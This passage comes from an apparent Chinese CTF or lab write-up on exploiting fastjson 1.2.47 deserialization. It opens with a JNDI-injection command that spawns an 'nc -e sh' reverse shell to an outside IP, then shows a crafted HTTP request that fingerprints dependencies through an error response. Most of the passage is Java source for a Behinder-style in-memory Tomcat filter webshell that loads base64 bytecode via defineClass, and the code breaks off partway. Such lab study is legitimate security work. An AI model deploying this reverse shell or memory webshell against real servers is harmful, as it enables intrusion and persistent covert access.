<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 123.60.157.194 -C “nc 123.60.157.194 9999 -e sh”</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/2d8acba4072d4c879ea4ab10af91e135.png" alt="123"></p>
<h2 id="1247-waf-c3p0（不出网）"><a href="#1247-waf-c3p0（不出网）" class="headerlink" title="1247-waf-c3p0（不出网）"></a>1247-waf-c3p0（不出网）</h2><p>检测是否是fastjson<br>dnslog测试<br><img src="https://img-blog.csdnimg.cn/direct/53df35833bc04995aa2c060a77358560.png" alt="123"><br>探测fastjson版本<br><img src="https://img-blog.csdnimg.cn/direct/4c995cb6fab94fec9d20e7f9b53bb337.png" alt="123"><br>爆出的版本为1.2.47，在这个版本下fastjson存在mappings缓存通杀绕过，利用方式为jndi</p>
<h3 id="jndi利用条件"><a href="#jndi利用条件" class="headerlink" title="jndi利用条件"></a>jndi利用条件</h3><p>1、环境一般出网<br>2、收到JDK版本限制，JDK8u191后受到trusturlcodebase限制了远程加载，当然还有绕过方法。</p>
<p>这台靶机不出网，因此JNDI注入不合适</p>
<p><img src="https://img-blog.csdnimg.cn/direct/e9f3324d282145459da43ecb64c887c1.png" alt="13"></p>
<p>下一步探测存在的依赖：<strong>利用Character转换报错可以判断存在哪种依赖</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /login HTTP/1.1
Host: 123.60.157.194
Content-Length: 127
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://123.60.157.194
Referer: http://123.60.157.194/tologin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

&#123;"x":&#123;"@type":"java.lang.Character"&#123;"@type":"java.lang.Class","val":"org.springframework.web.bind.annotation.RequestMapping"&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 500 
Server: nginx/1.15.12
Date: Thu, 28 Mar 2024 15:37:12 GMT
Content-Type: application/json
Connection: close
Content-Length: 212

&#123;"timestamp":"2024-03-28T15:37:12.688+0000","status":500,"error":"Internal Server Error","message":"can not cast to char, value : interface org.springframework.web.bind.annotation.RequestMapping","path":"/login"&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>RequestMapping</code>本身为SpringBoot下的类，当存在该类时会爆出类型转换错误，说明为SpingBoot项目。<br>否则无显示：<br><img src="https://img-blog.csdnimg.cn/direct/3abf7d9a95f04a0c8c245a4823dc9a2b.png" alt="123"><br>那么接下来就尝试fastjson利用链poc所需要的依赖类<br><img src="https://img-blog.csdnimg.cn/direct/e41ac08321b34bd2a5a6e162655f816f.png" alt="132"></p>
<p>下面真的不会了<a href="https://github.com/lemono0/FastJsonParty/blob/main/1247-waf-c3p0/write-up.md">查看资料</a>进行复现吧🥱<br>更改一个冰蝎的内存马编译为FRain.java文件编译为class文件。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//FRain.java</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Cipher</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">SecretKeySpec</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">DispatcherType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterConfig</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpSession</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">ApplicationFilterConfig</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">StandardContext</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span><span class="token class-name">WebappClassLoaderBase</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>descriptor<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">FilterDef</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>descriptor<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">FilterMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span><span class="token class-name">BASE64Decoder</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IceShell</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> pa <span class="token operator">=</span> <span class="token string">"3ad2fddfe8bad8e6"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">IceShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>servletRequest<span class="token punctuation">;</span>
        <span class="token class-name">HttpServletResponse</span> response <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span>servletResponse<span class="token punctuation">;</span>
        <span class="token class-name">HttpSession</span> session <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> pageContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> session<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"response"</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ClassLoader</span> cl <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Class</span> <span class="token class-name">Lclass</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">RushThere</span><span class="token punctuation">(</span><span class="token class-name">Class</span> <span class="token class-name">Lclass</span><span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span> cl<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> pageContext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Method</span> define <span class="token operator">=</span> <span class="token class-name">Lclass</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            define<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Class</span> uclass <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                uclass <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"U"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> var18<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                uclass <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span>define<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>cl<span class="token punctuation">,</span> bytecode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytecode<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> uclass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> u <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
